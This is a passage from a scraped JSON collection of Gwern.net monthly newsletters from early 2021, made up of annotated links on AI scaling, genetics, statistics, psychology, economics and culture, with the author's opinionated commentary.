Note on Piffles\u2019\u201d\\n, Farlow 1980)\\n\u201cArtifact and Recording Concepts in EEG\u201d\\n, Tatum et al 2011 (on the\\nEEG\\nsignals of\\nJell-O\\n, or, the importance of\\nnegative controls\\n)\\n2.4 Politics/Religion\\n\u201cThe Logic of Fashion Cycles\u201d\\n, Acerbi et al 2012;\\n\u201cFashion and art cycles are driven by counter-dominance signals of elite competition: quantitative evidence from music styles\u201d\\n, Klimek et al 2019;\\n\u201cThe hipster effect: When anti-conformists all look the same\u201d\\n, Touboul 2019;\\n\u201cRight Is The New Left\u201d\\n, Scott Alexander (see also\\nHan et al 2010\\n,\\nDowns 1972\\n/\\nGupta &amp; Jenkins-Smith 2015\\n,\\nLorenz-Spreen et al 2019\\n/\\nCandia et al 2019\\n,\\nLoury 1994\\n)\\n\u201cWhat can we learn from the lunar pandemic that never was?\u201d\\n(NASA\u2019s lunar quarantine was a sham intended to mollify the public as  they covered up repeated major failures &amp; lab leaks both before  &amp; after\u2014had there been any dangerous lunar organisms, they would  have escaped easily)\\nMrBeast\\n(the new aristocracy of\\nprestige\\n? Borrowed plumage, perhaps, but effective\u2026)\\n\u201cRussia\u2019s new Lysenkoism\u201d\\n, Kolchinsky et al 2017\\n2.5 Psychology/Biology\\nSemaglutide\\n:\\n\u201cOnce-Weekly Semaglutide in Adults with Overweight or Obesity\u201d\\n, Wilding et al 2021;\\n\u201cEffect  of Subcutaneous Semaglutide vs Placebo as an Adjunct to Intensive  Behavioral Therapy on Body Weight in Adults With Overweight or Obesity:  The STEP 3 Randomized Clinical Trial\u201d\\n, Wadden et al 2021\\nA longer-acting version of the insulin/appetite peptide\\nliraglutide\\n, semaglutide greatly reduces weight, fat, blood sugar, cholesterol etc, with an\\nupcoming oral version\\n; background:\\nKushner et al 2020\\n,\\nAroda et al 2019\\n,\\nNauck &amp; Meier 2019\\n,\\nO\u2019Neil et al 2018\\n,\\nBlundell et al 2017\\n,\\nNauck et al 2016\\n,\\nLau et al 2015\\n.\\n\u201cLessons from the host defences of bats, a unique viral reservoir\u201d\\n, Irving et al 2021 (\\nbat-borne viruses\\n; previously,\\nTrevor Klee\\n)\\n\u201cBeneficial  &amp; Detrimental Effects of Reactive Oxygen Species on Lifespan: A  Comprehensive Review of Comparative &amp; Experimental Studies\u201d\\n,  Shields et al 2021 (antioxidants still aren\u2019t the fountain of youth, and  may be harmful; animal studies still frequently inconsistent)\\n\u201cPositive expectations predict improved mental-health outcomes linked to psychedelic microdosing\u201d\\n, Kaertner et al 2021 (placebo)\\n\u201cThe Effects of Fluoride in Drinking Water\u201d\\n, Aggeborn &amp; \u00d6hman 2021\\n\u201cSleep  &amp; Sex: What Can Go Wrong? A Review of the Literature on Sleep  Related Disorders and Abnormal Sexual Behaviors &amp; Experiences\u201d\\n, Schenck et al 2007\\n2.6 Technology\\nNew X-Prize: $100m in prizes for Carbon Removal\\nWringing gauge blocks\\n(\u201cWith their precisely-flat metal faces, gauge blocks can be stuck  together non-magnetically via a process calling \u2018wringing\u2019, requiring  substantial effort to separate. Scientists are still uncertain exactly  how wringing works.\u201d)\\nArmored train\\n2.7 Economics\\n\u201cWhy did renewables become so cheap so fast? And what can we do to use this global opportunity for green growth?\u201d\\n, Max Roser (specifically, why such an extreme\\nexperience curve\\n?)\\n\u201cIQ, trading behavior, and performance\u201d\\n, Grinblatt et al 2012;\\n\u201cGenetic Endowments and Wealth Inequality\u201d\\n,  Barth et al 2020 (why, despite notorious setbacks, did Isaac Newton  &amp; LTCM\u2019s founders die wealthy? Why, in general, are more intelligent  people so much better investors? \u2018The indifference of the indicator\u2019:  it\u2019s not one thing, it\u2019s everything\u2014more intelligent people have lower  discount rates, save more for longer &amp; are less risk-averse, more  accurately predict future growth or inflation, are more likely to  participate in +EV opportunities like the stock market, to use low-fee  rather than high-fee (and thus, underperforming) mutual funds, succumb  less to biases like herding as they trade better &amp; at better times,  trade less, and harvest losses more efficiently when trading poorly.)\\n2.8 Philosophy\\nAre\\nethics experts more ethical\\n?\\n\u201cThe Behavior of Ethicists\u201d\\n, Schwitzgebel &amp; Rust 2016 (most recently:\\n\u201cThe moral behavior of ethics professors: A replication-extension in German-speaking countries\u201d\\n,  Sch\u00f6negger et al 2019; given moral licensing &amp; activism, perhaps we  should be surprised we don\u2019t hear about more ethicists doing things  like posting enemy lists or trying to dox reviewers. \u201cWoe to you  Pharisees!\u201d)\\n\u201cMeta-analysis on belief in free will manipulations\u201d\\n, Genschow et al 2021 (another noble lie turns out to be ignoble)\\nGricean maxims of communication\\n2.9 Fiction\\nBunnies &amp; Burrows\\n2.10 Miscellaneous\\n\u201cCaesar Lives\u201d\\n,\\nIggy Pop\\n1995 (on\\nGibbon\\n)\\nMad honey\\nImperial Court System","text":""},{"location":"gwern.net/Jan%202021%20Gwern.net%20Newsletter_20260205/","title":"Jan 2021 Gwern.net Newsletter\\n\\n\u6765\u6e90: https://gwern.net\\n\u94fe\u63a5: https://gwern.substack.com/p/jan-2021-gwernnet-newsletter\\n\u65e5\u671f: Thu, 04 Feb 2021 20:23:01 GMT\\n\\n---\\n\\nJanuary 2021\u2019s\\nGwern.net\\nnewsletter\\nis now out; previous,\\nDecember 2020\\n(\\narchives\\n). This is a summary of the revision-history RSS feed, overlapping with my\\nChangelog\\n&amp; /r/gwern; brought to you by my donors on\\nPatreon\\n.\\n1 Writings\\n\u201cDanbooru2020: A Large-Scale Crowdsourced and Tagged Anime Illustration Dataset\u201d\\nThis Anime Does Not Exist.ai (TADNE)\\n(\\ndiscussion\\n)\\nGwern.net\\n: +return-to-top floating button;\\npopups\\n:  can now be disabled (use the \u2018gear\u2019 icon); final reimplementation  (dynamic JS now; memoizing the recursive inlining, however clever &amp;  elegant, turns out to have painful edge-cases &amp; still not be  efficient enough\u2014web browsers\\nreally\\ndon\u2019t like loading hundreds of kilobytes of extra HTML)\\n2 Links\\n2.1 AI\\nMatters Of Scale\\n:\\nScaling up\\n:\\n\u201cDALL\u00b7E: Creating Images from Text\u201d\\n, OpenAI (GPT-3-12.5b generating 1280 tokens \u2192\\nVQ-VAE\\npixels; generates illustration &amp; photos);\\n\u201cCLIP (Contrastive Language-Image Pre-training): Connecting Text and Images\u201d\\n, OpenAI (\\nRadford et al 2021\\n: zero-shot image understanding via text description\u2014useful for much more than just ranking DALL\u00b7E samples by quality)\\nFurther\\nblessings of scale\\n: simple\\ncontrastive\\ntraining on\\nn\\n= 400m leads to remarkable generalization &amp; combinatorial  flexibility of image generation by DALL\u00b7E, and CLIP learns to reach  image classification SOTA by zero-shot on many datasets, with more  human-like errors &amp; less degradation out of samples than rivals,  while costing the same to train. OpenAI released their smallest CLIP  model (the \u201c\\nViT\\n-B/32\u201d-equivalent)  and people are discovering it seems able to do just about anything  without any further training\u2014the paper notes that it does everything  from \u201cfine-grained object classification, geo-localization, action  recognition in videos, and OCR\u201d, but there\u2019s so much more, and you can  use it to generate image captions/descriptions, classify your anime  images, pull a specific target image description by gradient ascent or  out of another neural network such as an ImageNet\\nBigGAN\\nor TADNE StyleGAN2-ext (or, why not, synthesize images images embodying  abstract concepts like emoji or words like \u201cnightmare fuel\u201d or  \u201cconfusion\u201d!), search your image datasets by embedding, find mislabeled  images (eg by\\nusing \u201cupside down\u201d as the prompt\\n)\u2026  One wonders, like GPT-3, how much better the largest CLIP  (\u201cL/14-336px\u201d) is and how many ways of using it (or DALL\u00b7E) remain to be  found? And why prediction losses work so well in one place, but then  contrastive elsewhere?\\nFor perspective: there are newly-minted PhDs going on the job market who got excited about deep learning because of these new\\n\u201cresnet\u201d\\nthings; undergrads who applied to grad school because\\nBERT\\net al were blowing open NLP &amp; extending neural supremacy to natural  language would not yet have passed quals; and it has been only 1  academic semester since\\nGPT-3\\nwas announced. Or to put it quantitatively, for just sequence modeling: it has been 8,478 days since\\nLSTM\\nRNNs were published; 3,045 days since\\nAlexNet\u2019s\\nImageNet scores were released; 1,880 days since residual networks were published in a paper; 1,330 days since\\n\u201cAttention Is All You Need\u201d\\nhit Arxiv; 844 days since BERT\u2019s paper was published; 718 days since\\nGPT-2\\nwas announced; 353 days since\\nSimCLR\\n, and 249 days since GPT-3 was; and 27 days since CLIP/DALL\u00b7E.^1^\\nSpring is coming.\\n(Some still insist we need not worry about \u201coverpopulation on Mars\u201d for &gt;18,264 more days\u2026)\\n\u201cMeta Pseudo Labels\u201d\\n, Pham et al 2020 (90% on ImageNet by pretraining a meta-learning teacher using JFT-300M on a TPUv3-2048)\\n\u201cSwitch Transformers: Scaling to Trillion Parameter Models with Simple and Efficient Sparsity\u201d\\n, Fedus et al 2021 (1.57t-parameter\\nGShard\\nfollowup; the mixture-of-experts approach, while scaling stably, starts showing its limits)\\nScaling down\\n:\\n\u201cDeiT: Training data-efficient image transformers &amp; distillation through attention\u201d\\n, Touvron et al 2020 (scaling Transformer classifiers down to ImageNet+1-GPU);\\n\u201cBoTNet: Bottleneck Transformers for Visual Recognition\u201d\\n, Srinivas et al 2021/\\n\u201cTokens-to-Token ViT: Training Vision Transformers from Scratch on ImageNet\u201d\\n, Yuan et al 2021 (hybrids);\\n\u201cnot-so-BigGAN: Generating High-Fidelity Images on Small Compute with Wavelet-based Super-Resolution\u201d\\n, Han et al 2020/\\n\u201cVQGAN: Taming Transformers for High-Resolution Image Synthesis\u201d\\n, Esser et al 2020 (training &gt;1024px Transformer GANs on just 2 GPUs)\\nTransformer supremacy in image-related tasks continues, and GANs  are becoming increasingly hybridized. Do pure-GANs have a future, now  that VAEs and autoregressive models are making such inroads into both  the highest-quality &amp; lowest-compute sample generation? To take the  GAN/DRL analogy seriously, perhaps they were they ultimately a dead end,  akin to trying to learn everything from rewards, and an adversarial GAN  loss ought to be only\\nthe cherry on the cake\\nof a large unsupervised/semi-supervised generative model.\\n\u201cZeRO-Offload: Democratizing Billion-Scale Model Training\u201d\\n, Ren et al 2021 (partial CPU training for 13b-parameter models on 1 V100 GPU, scaling to 128 GPUs)\\n\u201cPrefix-Tuning: Optimizing Continuous Prompts for Generation\u201d\\n, Li &amp; Liang 2021 (could the\\nPET\\n&amp; CLIP trick of averaging multiple embeddings to yield much better  performance be reused for GPT-3 prompts to greatly improve prompting?  The fact that the prefix-tuning, by directly optimizing the prompt  embeddings, yields better performance than even single optimized text  prompts, suggests so. The user could provide 3 or 4 similar prompts, and  synthesize them into a single super-prompt to better program GPT-3\u2026)\\n\u201cScaling down Deep Learning\u201d\\n,  Greydanus 2020 (cute: parametric simplified-MNIST for rapid iteration  on tiny NNs: experiments in lottery-ticket &amp; meta-learning of  LRs/activations)\\n\u201cThe neural network of the Stockfish chess engine\u201d\\n(very lightweight NN designed for incremental recomputation over changing board states)\\n\u201cTransformers in Vision: A Survey\u201d\\n, Khan et al 2021\\nOpenAI departures\\n:  Dario Amodei, Sam McCandlish, Tom Brown, Tom Henighan, Chris Olah, Jack  Clark, Ben Mann, Paul Christiano et al leave\u2014most for an unspecified  new entity (\\n\u201cthe elves leave Middle Earth\u201d\\n?)\\nAnd the rest:\\n\u201c2020 AI Alignment Literature Review and Charity Comparison\u201d\\n, Larks\\n\u201cGrounded Language Learning Fast and Slow\u201d\\n, Hill et al 2020\\n\u201cDeBERTa: Decoding-enhanced BERT with Disentangled Attention\u201d\\n, He et al 2020 (\\nSuperGLUE\\nfalls)\\n\u201cSolving Mixed Integer Programs Using Neural Networks\u201d\\n, Nair et al 2020\\n\u201cTowards Fully Automated Manga Translation\u201d\\n, Hinami et al 2020\\n\u201cUPDeT: Universal Multi-agent Reinforcement Learning via Policy Decoupling with Transformers\u201d\\n, Hu et al 2021\\n\u201cFERM: A Framework for Efficient Robotic Manipulation\u201d\\n, Zhan et al 2021 (contrastive semi-supervised learning + data augmentation for sample-efficiency)\\n\u201cXMC-GAN: Cross-Modal Contrastive Learning for Text-to-Image Generation\u201d\\n, Zhang et al 2021\\n2.2 Genetics\\nEverything Is Heritable:\\n\u201cNurture might be nature: cautionary tales and proposed solutions\u201d\\n, Hart et al 2021\\n\u201cA genetic perspective on the association between exercise and mental health in the era of genome-wide association studies\u201d\\n, de Geus 2020;\\n\u201cEvidence for shared genetics between physical activity, sedentary behaviour and adiposity-related traits\u201d\\n, Schnurr et al 2020\\n\u201cAntidepressant Response in Major Depressive Disorder: A Genome-wide Association Study\u201d\\n, Pain et al 2020\\n\u201cGenome wide analysis of gene dosage in 24,092 individuals shows that 10,000 genes modulate cognitive ability\u201d\\n, Huguet et al 2020 (yep, still polygenic)\\n\u201cGWAS of three molecular traits highlights core genes and pathways alongside a highly polygenic background\u201d\\n, Sinnott-Armstrong et al 2021\\n\u201cGenome-scale sequencing and analysis of human, wolf and bison DNA from 25,000 year-old sediment\u201d\\n, Gelabert et al 2021 (incredible this is possible)\\n\u201cDisentangling  sex differences in the shared genetic architecture of PTSD, traumatic  experiences, and social support with body size and composition\u201d\\n, Carvalho et al 2021 (\\nLCV\\n)\\nRecent Evolution:\\n\u201cAfrican genetic diversity and adaptation inform a precision medicine agenda\u201d\\n, Pereira et al 2021;\\n\u201cThe influence of evolutionary history on human health and disease\u201d\\n, Benton et al 2021;\\n\u201cLocal adaptation and archaic introgression shape global diversity at human structural variant loci\u201d\\n, Yan et al 2021\\n\u201cGenome scans of dog behavior implicate a gene network underlying psychopathology in mammals, including humans\u201d\\n, Zapata et al 2021\\n\u201cNatural Selection in Contemporary Humans is Linked to Income and Substitution Effects\u201d\\n, Hugh-Jones &amp; Abdellaoui 2021\\n\u201cThe diversity and function of sourdough starter microbiomes\u201d\\n, Landis et al 2021 (crowdsourced sourdough show little trace of geographic origins?)\\nEngineering:\\n\u201cIn vivo base editing rescues Hutchinson-Gilford progeria syndrome in mice\u201d\\n, Koblan et al 2021\\n\u201cFrom Genotype to Phenotype: polygenic prediction of complex human traits\u201d\\n, Raben et al 2021\\n2.3 Statistics/Meta-Science/Math\\n\u201cThe Quantum Field Theory on Which the Everyday World Supervenes\u201d\\n,  Carroll 2021 (\u201c\u2026we have reason to be confident that the laws of physics  underlying the phenomena of everyday life are completely known\u201d because  all unknown particles/fields are constrained to being extremely  rare/weak, eg by\\nAdelberger et al 2009\\n)\\n\u201cHow accurate are citations of frequently cited papers in biomedical literature?\u201d\\n, Pavlovic et al 2020 (includes original author\u2019s evaluation of whether a citation of their work is correct)\\n\u201cEnergy-Efficient Algorithms\u201d\\n, Demaine et al 2016 (\\nreversible computing\\nasymptotics: constant-factor\\nstacks\\n/\\narrays\\n, \ud835\udcaa(log\\nn\\n) time/energy\\nAVL trees\\n, \ud835\udcaa(\\nn\\n) space\\nsorts\\n, &amp; various \ud835\udcaa(Vertex+Edge) time/space/energy\\ngraph searches\\n)\\n\u201cThe Optimizer\u2019s Curse: Skepticism and Postdecision Surprise in Decision Analysis\u201d\\n,  Smith &amp; Winkler 2006 (regression to the mean is everywhere; another  example of why Bayes &amp; decision theory are two great flavors that  go great together)\\n2.4 Politics/Religion\\n\u201cThe Mechanisms of Cult Production: An Overview\u201d\\n, Xavier Marquez 2020 (see previously his\\nblog roundup\\n)\\n\u201cWhen Prophecy Fails and Faith Persists: A Theoretical Overview\u201d\\n, Dawson 1999\\n\u201cWhy We Fight Over Fiction\u201d\\n, Robin Hanson\\nThe All-Woman Supreme Court\\n2.5 Psychology/Biology\\n\u201cStill Alive\u201d\\n,  Scott Alexander (announcement of SSC return as Substack newsletter  \u2018Astral Codex Ten\u2019 &amp; launching a low-cost psychiatry clinic \u2018Lorien  Psychiatry\u2019)\\n\u201cThe Temporal Dynamics of Opportunity Costs: A Normative Account of Cognitive Fatigue and Boredom\u201d\\n, Agrawal et al 2020\\n\u201cA unified framework for association and prediction from vertex-wise grey-matter structure\u201d\\n, Couvy-Duchesne et al 2020 (more\\nmorphometricity\\n)\\nCommon phenomena\\n:\\n\u201cSounds from seeing silent motion: Who hears them, and what looks loudest?\u201d\\n, Fassnidge &amp; Freeman 2018 (on \u2018visual ear\u2019; previously:\\nSaenz &amp; Koch 2008\\n,\\nFassnidge et al 2017\\n)\\n\u201cPredicting Mental Health From Followed Accounts on Twitter\u201d\\n, Costelli et al 2021 (\\nRegistered Report\\n: who you choose to follow says a lot about you\u2014\\neverything is correlated\\n)\\n\u201cNo evidence for general intelligence in a fish\u201d\\n, Aellen et al 2021\\nDelirium tremens\\n\u201cMicrobiome connections with host metabolism and habitual diet from 1,098 deeply phenotyped individuals\u201d\\n, Asnicar et al 2021\\n\u201cUniversal DNA methylation age across mammalian tissues\u201d\\n, Lu et al 2021;\\n\u201cWhole-body senescent cell clearance alleviates age-related brain inflammation and cognitive impairment in mice\u201d\\n, Ogrodnik et al 2021\\n\u201cBENDR: using transformers and a contrastive self-supervised learning task to learn from massive amounts of EEG data\u201d\\n, Kostas et al 2021 (towards brain imitation learning)\\nParker-Hulme murder case\\n;\\nThe Slender Man stabbing\\n(\\nparacosms?\\n)\\nCorrection\\n:\\nProgramming competition skills do not inversely correlate with job performance\\nafter all\\n2.6 Technology\\nNatural nuclear fission reactors (Oklo)\\n\u201cBaffles and Bastions: The Universal Features of Fortifications\u201d\\n, Keeley et al 2007\\nThe Corrupted Blood incident\\nFootnote\\n36: \u201cRedisturbed\u201d\\n: a\\nunicase\\nfont experiment\\n2.7 Economics\\n\u201cBusinesses Aim to Pull Greenhouse Gases From the Air. It\u2019s a Gamble\u201d\\n\"Does Advertising\\nActually Work?\"\\n(what could be more obvious than \u201cadvertising works\u201d, and trivial to  confirm with correlational data? Yet, the tedious saying \u201ccorrelation \u2260  causation\u201d stubbornly insists on being true);\\n\u201cDigital Paywall Design: Implications for Content Demand and Subscriptions\u201d\\n, Aral &amp; Dhillon 2020 (NYT nag-paywall caused \u22129.9% reading; in line with\\nall the other results\\n)\\n\u201cWho Gains and Who Loses from Credit Card Payments? Theory and Calibrations\u201d\\n, Schuh et al 2010 (a compelling case for getting a rewards credit card if you\u2019re a\\ndebit card\\nuser\u2014why subsidize them so much?)\\n\u201cSqueezing the bears: cornering risk and limits on arbitrage during the \u2018British bicycle mania\u2019, 1896\u20131898\u201d\\n, Quinn 2019\\n2.8 Fiction\\n\u201cOn Venus, Have We Got a Rabbi!\u201d\\n,\\nWilliam Tenn\\n2016\\n\u201cSt Martin\u2019s Four Wishes\u201d\\n, Anonymous\\nmedieval poet\\n(trans. Dubin 2013)\\n2.9 Miscellaneous\\nThe\\nAnglo-Japanese style\\nStalag Luft III\\nFerdinandea\\nBut it\u2019ll still be too many days \u2019till we say we\u2019re sorry.","text":""},{"location":"gwern.net/March%202021%20Gwern.net%20Newsletter_20260205/","title":"March 2021 Gwern.net Newsletter\\n\\n\u6765\u6e90: https://gwern.net\\n\u94fe\u63a5: https://gwern.substack.com/p/march-2021-gwernnet-newsletter\\n\u65e5\u671f: Tue, 06 Apr 2021 15:31:01 GMT\\n\\n---\\n\\nMarch 2021\u2019s Gwern.net\\nnewsletter\\nis now out; previous,\\nFebruary 2021\\n(\\narchives\\n). This is a summary of the revision-history RSS feed, overlapping with my\\nChangelog\\n&amp;\\n/r/gwern\\n; brought to you by my donors on\\nPatreon\\n.\\n1 Writings\\nGwern.net\\n: mobile \u201cpopins\u201d are finally enabled! (\\nexample\\n); new Wikipedia popups (this 7th implementation enables\\nrecursive\\nWP popups\\n)\\n2 Links\\n2.1 AI\\n\u201cMultimodal Neurons in Artificial Neural Networks\u201d\\n, Goh et al 2021 (dissecting\\nCLIP\\nconcepts, discovering typographical classification \u2018attacks\u2019^1^ and a\\nStroop effect\\n! Is there anything CLIP can\u2019t do?)\\n\u201cEvolving Reinforcement Learning Algorithms\u201d\\n, Co-Reyes et al 2021 (evolving eg\\nTD-learning\\n)\\n\u201cWaymo Simulated Driving Behavior in Reconstructed Fatal Crashes within an Autonomous Vehicle Operating Domain\u201d\\n, Scanlon et al 2021 (\\nblog\\n; hard negative mining\u2014self-driving cars, being inhuman, can learn not just from their mistakes but humans\u2019 mistakes too)\\n\u201cDebugging Reinforcement Learning Systems Without The Agonizing Pain\u201d\\n, Andy L. Jones;\\n\u201cMy Reinforcement Learning Learnings\u201d\\n, Clemens Winter\\nMatters Of Scale\\n:\\n\u201cSEER: Self-supervised Pretraining of Visual Features in the Wild\u201d\\n, Goyal\u00a0et\u00a0al\u00a02021 (\\nblog\\n;  near-SOTA by training 1b-param CNN on 1b unfiltered unlabeled Internet  images\u2014another reminder that unsupervised learning is really working!);\\n\u201c\u2018Learning From Videos\u2019 to understand the world\u201d\\n(rapid FB expansion of self-supervised training to millions of photos/videos/hours-of-speech);\\n\u201cContrasting Contrastive Self-Supervised Representation Learning Models\u201d\\n,  Kotar et al 2021 (Supervised learning from ImageNet is now obsolete for  transfer learning, and ImageNet just a contaminated validation set)\\n\u201cUnderstanding Robustness of Transformers for Image Classification\u201d\\n, Bhojanapalli et al 2021 (\\nVision Transformers\\ngain robustness faster than CNNs as dataset size increases)\\n\u201cArtificial Intelligence Index Report 2021\u201d\\n: technical performance and cost (\\nDing questions\\nwhether this shows China catching up on AI at all, as we are  incessantly told it is doing; one question to ask: ignoring  fast-following, what, out of the thousands upon thousands of  publications flooding out these days, are the last 3\\nmajor novel\\nAI breakthroughs coming out of all pure-Chinese labs combined which  could be plausibly equated in importance with, say, just OpenAI\u2019s recent  output of\\nGPT-3\\n/\\nDALL\u00b7E\\n/CLIP?)\\nOA GPT-3 API: &gt;300 apps, &gt;10k developers, &gt;4.5b words per day\\n\u201cA mathematical theory of semantic development in deep neural networks\u201d\\n, Saxe et al 2019 (are jumps in NN capabilities to be expected when scaling? see also\\nViering &amp; Loog 2021\\n\u2019s discussion of phase transitions &amp; averaging of exponentials giving power-laws)\\n\u201cAn early cell shape transition drives evolutionary expansion of the human forebrain\u201d\\n, Benito-Kwiecinski et al 2021 (\\nmedia\\n; a simple switch for the\\nscaling up\\nof the primate brain)\\n\u201cCrows possess higher intelligence long thought primarily human\u201d\\n(the remarkable, yet not extraordinary, crow/raven brain as scaled-up\\nbird brain\\n)\\n2.2 Genetics\\nEverything Is Heritable:\\n\u201cGWAS in almost 195,000 individuals identifies 50 previously unidentified genetic loci for eye color\u201d\\n, Simcoe et al 2021\\n\u201cWhy Do Wealthy Parents Have Wealthy Children?\u201d\\n,  Fagereng\u00a0et\u00a0al\u00a02021 (I\u2019m always impressed just how difficult it is for  rich people to pass on wealth\u2014\u201cshirtsleeves to shirtsleeves in 3  generations\u201d etc)\\nEvolution:\\n\u201cNothing in evolution makes sense except in the light of parasites\u201d\\n, Hickinbotham et al 2021\\nEngineering:\\n\u201cThe Demise and Potential Revival of the American Chestnut\u201d\\n2.3 Statistics/Meta-Science\\n\u201cBroad cross-national public support for accelerated COVID-19 vaccine trial designs\u201d\\n,  Broockman et al 2021 (\u201cwe can\u2019t do challenge trials with volunteers in  February 2020 to save countless thousands of lives because ordinary  people might think it unethical\u201d\u2014have you tried\\nasking\\nthem, or was that irrelevant because it was just another noble lie?)\\n\u201cThis is the story of how I found what I believe to be scientific misconduct and what happened when I reported it\u201d\\n, Joe Hilgard\\n\u201cThe Revolution in Classic Tetris: How a younger generation used the Internet to master the falling blocks\u201d\\n(how achieving classic Tetris maximum-scores, first done in 2010, became routine thanks to YouTube &amp;\\nonline competition for excellence\\n)\\n2.4 Politics/Religion\\n\u201cMagic, Explanations, and Evil: The Origins and Design of Witches and Sorcerers\u201d\\n, Singh 2021 (doubtless even cavemen were all \u201cOg: sus.\u201d)\\n\u201cSelf-blinding citizen science to explore psychedelic microdosing\u201d\\n, Szigeti et al 2021 (related to\\nKaertner et al 2021\\n; a self-blinding study, similar to my old self-blinding protocols, confirms that microdosing is just placebo effect, as\\nI said in 2012\\n, and I\u2019m reminded of DNB studies like\\nForoughi et al 2016\\n)\\nThe 2019\u20132020 vaping moral panic\\nover adulterated black-market THC products (depressing to see how  irresponsibly reported &amp; alarmist this was, and how everyone  attempted to frame nicotine for it\\n2\\n. Naturally, no one involved has apologized or admitted fault\u2014after all, their\\nintentions\\nwere good\\n,  \u201cwon\u2019t someone think of the children\u201d\u203d The incompetence and/or  dishonesty here emphasizes how 2020\u20132021 was business as usual, and the  only unusual part is that reality happened so fast we saw some of\\nthe unseen\\n.)\\nMark Hofmann\\nAlexandra David-N\u00e9el\\n(one of\\nthose\\n1800\u20131900s biographies)\\nJohn Harvey Kellogg\\n2.5 Psychology/Biology\\n\u201cCan You Ever Be Too Smart for Your Own Good? Comparing Linear and Nonlinear Effects of Cognitive Ability on Life Outcomes\u201d\\n, Brown et al 2021\\n\u201cThe pandemic fallacy: Inaccuracy of social scientists\u2019 and lay judgments about COVID-19\u2019s societal consequences in America\u201d\\n, Hutcherson et al 2021 (highly-inaccurate even retrospectively, typically grossly overestimating)\\n\u201cTraining Working Memory for Two Years\u2014No Evidence of Latent Transfer to Intelligence\u201d\\n, Watrin et al 2021 (fade-out of expectancy/placebo effects)\\n\u201cReal-time dialogue between experimenters and dreamers during REM sleep\u201d\\n, Konkoly et al 2021\\n\u201cLeroy\u2019s elusive little people: A systematic review on lilliputian hallucinations\u201d\\n, Blom 2021 (\\nAlice in Wonderland syndrome\\n)\\n\u201cA  Group of Orca Outcasts Is Now Dominating an Entire Sea: \u2018Transient\u2019  killer whales that feast on seals and hunt in small packs are thriving  while their widely beloved \u2018Resident\u2019 siblings are dying out\u201d\\n(I wonder how the third\\norca\\ntype,\\n\u2018offshore\u2019\\n, are doing?)\\n\u201cEstimation of the total saliva volume produced per day in 5-year-old children\u201d\\n, Watanabe et al 1995\\n2.6 Technology\\n\u201cThe Aesthetic-Usability Effect\u201d\\n, Moran 2017 (\\n\u201cThey Might Never Tell You It\u2019s Broken\u201d\\nif it\u2019s pretty enough; see also\\n\u201cThe Third User\u201d\\n)\\n\u201cCameras and Lenses\u201d\\n, Bartosz Ciechanowski (explorable; followup to\\n\u201cLights and Shadows\u201d\\n)\\n\u201cLarge Batch Simulation for Deep Reinforcement Learning\u201d\\n, Shacklett et al 2021 (your computer is faster than you think)\\n\u201cThe incredible boxes of Hock Wah Yeo\u201d\\n(unusual video game packaging design)\\n\u201cStone Walls That Stay Built: A master waller shares how to dry-lay stone walls that hold their ground for centuries\u201d\\n, Post 2017\\nAutomated storage and retrieval system\\nVisual cryptography\\n2.7 Economics\\n\u201cThe Use and Misuse of Income Data and Extreme Poverty in the United States\u201d\\n, Meyer et al 2021 (measurement error in non-registry surveys of population extremes\u2014not quite\\n\u201clizardman\u201d\\nbut similar problem)\\n\u201cIs economics performative? Option theory and the construction of derivatives markets\u201d\\n, Mackenzie 2006 (the mechanics of how the\\nBlack-Scholes model\\nchanged markets:\\nBlack\\nran a service printing \u201cpaper\u201d estimating optimal prices for all  options which traders could consult &amp; use with simple heuristics to  try to arbitrage the market)\\n\u201cWhitewood under Siege: On the front lines of the pallet wars\u201d\\n(the competition between the two ecosystems of shipping\\npallets\\n: \u2018whitewood\u2019 &amp; \u2018blue pallet\u2019)\\nMautam\\n2.8 Philosophy\\n\u201cCoping with mortality: responses of monkeys and great apes to collapsed, inanimate and dead conspecifics\u201d\\n, De Marco et al 2021\\nBraitenberg vehicle\\n2.9 Fiction\\n\u201cReply of the Zaporozhian Cossacks\u201d\\n2.10 Miscellaneous\\nAmerica\u2019s top ace,\\nMajor Dick Bong\\n3 Film/TV\\nLive-action:\\nNorth by Northwest\\n(\\nHitchcock\\n1959; for such a extremely respected movie, it felt oddly formless and  like it was bouncing through genres as more of a comedic B-movie romp  than a serious auteur\u2019s effort\u2014since James Bond started in 1953, with a  TV adaptation in 1954, NbN comes off as almost a satire. I mean, really,  monkeying around in Presidential noses!)\\nWhile interesting, these are \u2018attacks\u2019 only in the most generous interpretation possible (since it\\ndoes know\\nthe difference\\n),  and the fact that CLIP can read text in images to note the semantic  similarity, is to considerable credit. As the CLIP authors\\nnote\\n,  some queries benefit from ensembling, more context than a single word  class name such as prefixing \u201cA photograph of a\u201d, and class names can be  highly ambiguous: in ImageNet, the class name \u201ccrane\u201d could refer to  the bird or construction equipment; and the Oxford-IIIT Pet dataset  labels one class \u201cboxer\u201d. (CLIP is still\\nvulnerable to regular adversarial examples\\n, of course.)\u21a9\\nIt\\ncouldn\u2019t\u2019ve\\nbeen  nicotine because people had been vaping for a decade and a half without  widespread near-instantaneous lung-related fatalities! It\\nhad\\nto be a new adulterant, and as soon as the first few black-market THC  links surfaced, that meant the problem had to be THC-products-only  because how would the same adulterant simultaneously get into the  different supply chains? And yet, every article, health official, and  activist did their paternalist best to suggest otherwise to pin the  blame on regular vaping, no matter how many tests turned up clean, and  it was the nicotine vaping products which got summarily banned\u2026. One  must assume many of those laws are still on the books, inasmuch as\\nthe shipping bans keep expanding\\n.\u21a9","text":""},{"location":"gwern.net/May%202021%20Gwern.net%20Newsletter_20260205/","title":"May 2021 Gwern.net Newsletter\\n\\n\u6765\u6e90: https://gwern.net\\n\u94fe\u63a5: https://gwern.substack.com/p/may-2021-gwernnet-newsletter\\n\u65e5\u671f: Fri, 11 Jun 2021 14:16:22 GMT\\n\\n---\\n\\nMay 2021\u2019s\\nGwern.net\\nnewsletter\\nis now out; previous,\\nApril 2021\\n(\\narchives\\n). This is a collation of links and summary of major changes, overlapping with my\\nChangelog\\n; brought to you by my donors on\\nPatreon\\n.\\nNote: I will be in Denver 12\u201313 June 2021 for a conference.\\n1 Writings\\nProposal\\n:\\n\u201cChoose Your Own Adventure AI Dungeon\u201d\\n;\\n\u201cDecision Transformers: Preference Learning As Simple As Possible\u201d\\n2 Links\\n2.1 AI\\nMatters Of Scale\\n:\\nHardware\\n:\\n\u201cPodracer architectures for scalable Reinforcement Learning\u201d\\n, Hessel et al 2021 (highly-efficient TPU pod use: eg solving Pong in &lt;1min at 43 million FPS on a TPUv3-2048);\\n\u201cGoogle details new TPUv4 AI accelerator 